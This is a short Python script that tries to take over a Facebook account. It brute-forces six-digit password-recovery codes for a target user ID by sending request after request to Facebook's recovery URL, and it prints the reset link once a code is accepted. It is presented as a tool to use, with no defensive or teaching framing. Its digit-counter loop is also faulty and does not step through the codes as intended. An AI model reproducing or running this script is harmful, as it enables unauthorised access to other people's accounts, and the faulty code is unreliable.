#! /usr/bin/python

import requests
import sys

i = 0

array = [0,0,0,0,0,0]
chars = "0123456789"
user_id = sys.argv[1]
lock = False

for i in range(1000000):
    password = ""

    i+=1
    if i % 10000 == 0:
        print(f'{i / 10000} / 100')

    for j in range(6):
        password += chars[array[j]]

    for j in range(6):
        array[j] += 1
        if array[j] >= 10:
            array[j] = 0
            break

    try:
        x = requests.get(f'https://www.facebook.com/recover/password/?u={user_id}&n={password}')
    except:
        if not lock:
            i-=1
            lock = True
        continue
    lock = False
    if 'password_new' in x.text:
        print(f'connect to https://www.facebook.com/recover/password/?u={user_id}&n={password}')
        sys.exit()

    print(f'{password}:{i+1}')
